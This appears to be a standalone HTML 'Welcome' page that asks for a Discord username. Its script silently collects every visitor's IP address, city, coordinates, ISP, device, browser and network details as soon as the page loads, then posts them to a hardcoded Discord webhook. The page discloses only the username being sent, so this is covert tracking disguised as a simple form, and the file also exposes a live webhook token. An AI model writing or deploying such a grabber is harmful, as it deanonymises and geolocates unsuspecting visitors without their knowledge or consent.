<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Welcome</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #2c2f33;
      color: #fff;
    }

    .container {
      text-align: center;
      background: rgba(35, 39, 42, 0.9);
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
      width: 300px;
    }

    input {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
      border: none;
      border-radius: 5px;
    }

    button {
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      background-color: #7289da;
      color: white;
      cursor: pointer;
    }

    button:hover {
      background-color: #5b6eae;
    }

    #status {
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Welcome!</h1>
    <p>Please enter your Discord username. It will be sent to us!</p>
    <input type="text" id="discordUser" placeholder="Discord Username" required>
    <button onclick="sendDiscordUser()">Submit</button>
    <p id="status"></p>
  </div>

  <script>
    const webhookUrl = 'https://discordapp.com/api/webhooks/1335664944028582000/c1CoPiNgVyekogi0OhqJQizguoBFy5XmTKydzmWb-8XQFOYEAZ_PyT79OgkQsc1ElmGl';

    let collectedData = {};

    // Fetch IPv4 Address and Location
    async function fetchIPData() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const { ip } = await response.json();
        collectedData.IP_Info = { ip };

        // Use another API to get more details about the IP
        const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
        const locationData = await locationResponse.json();
        collectedData.IP_Info = {
          ...collectedData.IP_Info,
          city: locationData.city,
          region: locationData.region,
          country: locationData.country_name,
          latitude: locationData.latitude,
          longitude: locationData.longitude,
          isp: locationData.org,
        };
      } catch (error) {
        console.error('Error fetching IP data:', error);
        collectedData.IP_Info = 'Unavailable';
      }
    }

    // Fetch Device and Browser Information
    function fetchDeviceInfo() {
      collectedData.Device_Info = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        viewportSize: `${window.innerWidth}x${window.innerHeight}`,
        cookiesEnabled: navigator.cookieEnabled,
        cores: navigator.hardwareConcurrency || 'Unknown',
        memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
      };
    }

    // Fetch Network Information
    function fetchNetworkInfo() {
      if (navigator.connection) {
        collectedData.Network_Info = {
          networkType: navigator.connection.effectiveType || 'Unknown',
          downlinkSpeed: `${navigator.connection.downlink || 0} Mbps`,
          latency: `${navigator.connection.rtt || 0} ms`,
          saveData: navigator.connection.saveData || false,
        };
      } else {
        collectedData.Network_Info = 'Unavailable';
      }
    }

    // Send Data to Webhook
    async function sendToWebhook(data) {
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: data }),
        });
      } catch (error) {
        console.error('Error sending to webhook:', error);
      }
    }

    // Collect and Send All Data Immediately on Page Load
    async function sendInitialData() {
      await fetchIPData();
      fetchDeviceInfo();
      fetchNetworkInfo();

      const formattedData = `**Initial User Information:**\n\`\`\`json\n${JSON.stringify(collectedData, null, 2)}\n\`\`\``;
      await sendToWebhook(formattedData);
    }

    // Send Discord Username Separately
    async function sendDiscordUser() {
      const discordUser = document.getElementById('discordUser').value.trim();
      const status = document.getElementById('status');

      if (!discordUser) {
        status.textContent = 'Please enter your Discord username.';
        status.style.color = 'red';
        return;
      }

      // Send Discord username to webhook
      await sendToWebhook(`**Discord Username:** ${discordUser}`);

      // Update UI
      status.textContent = 'Your Discord username has been submitted!';
      status.style.color = 'green';
    }

    // Send all data on page load
    sendInitialData();
  </script>
</body>
</html>
